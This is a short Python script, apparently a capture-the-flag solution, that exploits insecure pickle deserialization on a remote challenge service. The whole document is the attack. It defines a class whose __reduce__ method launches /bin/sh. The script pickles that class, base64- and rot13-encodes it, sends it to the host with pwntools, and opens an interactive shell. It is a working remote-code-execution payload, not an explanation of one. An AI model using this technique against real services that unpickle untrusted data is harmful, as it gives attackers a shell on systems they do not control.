import cPickle
import subprocess
import base64
import codecs
from pwn import *

class RunBinSh(object):
	def __reduce__(self):
		return (subprocess.Popen, (('/bin/sh',),))

def exploit(object):
	string = pickle.dumps(object)
	encoded = base64.b64encode(string).decode()
	return codecs.encode(encoded, "rot-13") 

r = remote("pwn.tamuctf.com",  8448)
r.sendline("4")

r.sendline(exploit(RunBinSh()))
r.interactive()
